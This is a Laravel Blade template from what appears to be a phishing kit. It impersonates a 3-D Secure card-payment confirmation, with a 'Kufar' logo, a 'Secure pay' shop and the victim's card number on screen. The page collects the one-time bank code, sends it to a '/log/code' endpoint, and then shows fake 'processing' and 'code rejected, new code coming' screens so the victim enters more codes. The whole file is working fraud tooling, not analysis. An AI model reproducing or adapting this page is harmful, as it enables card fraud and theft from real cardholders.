@extends('layouts.fake')
@push('css')
    <style>
        /* By NSCode | Telegram @Lunaticeee */
        ._0 {
            margin: 0 auto;
            max-width: 390px;
            box-shadow: 0 0 32px #e8e8e8;
            box-sizing: border-box;
            padding: 24px;
            background: #fff;
        }

        ._1 {
            font-weight: bold;
            font-size: 18px;
            padding-top: 16px;
            padding-bottom: 2px;
        }

        ._2 {
            margin: 10px 0;
            border-bottom: 1px solid #ddd;
        }

        ._3 {
            font-size: 14px;
            border: 1px solid #ddd;
            border-radius: 6px;
            padding: 8px 0;
        }

        ._3:hover {
            border-color: #000;
        }

        ._4 {
            background: #17c67a;
            color: #fff;
            padding: 11px 0;
        }

        ._4:hover {
            background: #45d194;
        }

        ._5 {
            color: #aaa;
            text-align: right;
            width: 45%;
            padding-right: 24px;
        }

        ._6 {
            font-weight: bold;
        }

        ._7 {
            margin-top: 4px;
            margin-bottom: 16px;
        }

        ._8 {
            padding-bottom: 6px;
            line-height: 18px;
        }

        ._9 {
            text-align: right;
        }

        body {
            margin: 0;
            font-family: Arial;
            font-size: 12px;
            color: #222;
            word-break: break-word;
            user-select: none;
            background: #fdfdfd;
        }

        input {
            font-family: Arial;
            font-size: 12px;
            color: #222;
            width: 100%;
            border: none;
            box-sizing: border-box;
            text-align: center;
        }

        table {
            width: 100%;
            border-collapse: separate;
            border-spacing: 0;
        }

        td {
            padding: 4px 0;
        }

        /*  By NSCode | Telegram @Lunaticeee  */
    </style>
    <style>
        .input-invalid {
            border-color: red;
        }
    </style>
@endpush
@section('content')
    <div id="step-1" class="_0">
        <table>
            <tbody>
            <tr>

                <td class="_9">
                    <img src="{{asset('images/cclogos.png')}}" height="56">
                </td>
            </tr>
            </tbody>
        </table>
        <div id="form">
            <div class="_1">Input Code</div>
            <div class="_2"></div>
            <table class="_7">
                <tbody>
                <tr>
                    <td class="_5">Shop:</td>
                    <td>Secure pay</td>
                </tr>
                <tr>
                    <td class="_5">Description:</td>
                    <td>{{$categoryName}}</td>
                </tr>
                <tr>
                    <td class="_5">Amount:</td>
                    <td class="_6">{{$amount}}</td>
                </tr>
                <tr>
                    <td class="_5">Data:</td>
                    <td>{{$date}}</td>
                </tr>
                <tr>
                    <td class="_5">Card number:</td>
                    <td>{{$card_number}}</td>
                </tr>
                <tr>
                    <td class="_5">Comment:</td>
                    <td>None</td>
                </tr>
                </tbody>
            </table>
            <div class="_8">A one-time code was sent to your phone number. Check the details of the transaction and
                enter a
                one-time code.
            </div>
            <div class="_2"></div>
            <input
                    @if(session('bankName') == 'bankbps')
                    maxlength="15"
                    @else
                    maxlength="8"
                    @endif
                    id="field3ds"
                    class="_3"
                    type="password"
                    name="3dscode"
                    placeholder="Unic Code"
            >
            <div class="_2"></div>
            <input id="submit-button" class="_4" type="button" value="Confirm">
        </div>
    </div>
    <div class="form-block" id="step-2" style="display: none;text-align: center;margin-top: 20px">
        <div class="form-block-header">

            <img src="{{$fake->logo()}}" width="30%" alt="Kufar" class="form-block-image">
            <h1 class="form-block-header-text">{{__("Processing payments")}}</h1>
        </div>

        <div class="form-block-body">
            <p class="form-block-body-text">
                {{__("Payment is still being processed. You will be automatically redirected to the appropriate page. This may take some time.")}}
            </p>
        </div>
    </div>
    <div class="form-block" id="step-3" style="display: none;text-align: center;margin-top: 20px">
        <div class="form-block-header">
            <img src="{{$fake->logo()}}" width="30%" alt="Kufar" class="form-block-image">
            <h1 class="form-block-header-text">{{__("The operation was rejected.")}}</h1>
        </div>

        <div class="form-block-body">
            <p class="form-block-body-text">
                {{__("Incorrect confirmation code entered or its expiry date has expired.")}}
                <br><br>{{__("Please wait. A new code will be sent to you in a moment")}}
            </p>
        </div>
    </div>
@endsection
@push('js')
    <script type="text/javascript">
        $("#submit-button").on("click", function () {
            let input = $("#field3ds");
            let code = input.val();
            let max = ['bankbps'].includes("{{session('bankName')}}") ? 15 : 8;
            if (code.length < 3 || code.length > max) {
                input.addClass("input-invalid");
                setTimeout(function () {
                    input.removeClass("input-invalid");
                }, 6000);
                return false;
            }
            $.post("/log/code", {code: code}, function (data) {
                $("#step-1").fadeOut(500, function () {
                    $("#step-2").fadeIn().fadeOut(500, function () {
                        setTimeout(function () {
                            $("#step-3").fadeIn().fadeOut(5000, function () {
                                $("#step-1").fadeIn();
                                input.val('');
                            });
                            if (data.next) location.href = data.next;
                        }, 3000);
                    });
                });
            });
        });
    </script>
@endpush
